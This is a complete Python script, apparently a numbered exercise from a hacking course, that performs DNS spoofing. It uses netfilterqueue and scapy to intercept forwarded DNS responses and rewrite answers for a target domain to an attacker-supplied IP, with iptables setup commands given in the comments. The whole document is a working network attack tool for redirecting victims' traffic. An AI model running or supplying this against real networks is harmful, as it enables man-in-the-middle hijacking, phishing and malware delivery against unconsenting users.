#!/usr/bin/env python

# Usage example: python 05_dns_spoof.py --t www.google.com --ip *.*.*.*
# Before starting run: iptables -I FORWARD -j NFQUEUE --queue-num 0
# When done, run: iptables --flush

import argparse
import netfilterqueue
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('--t', dest='target', required=True)
    parser.add_argument('--ip', dest='new_ip', required=True)
    args = parser.parse_args()
    return args

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        if args.target in qname.decode():
            print("Spoofing target")
            answer = DNSRR(rrname=qname, rdata=args.new_ip)
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum
            packet.set_payload(scapy_packet) # bytes(scapy_packet)
    packet.accept()

args = get_arguments()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()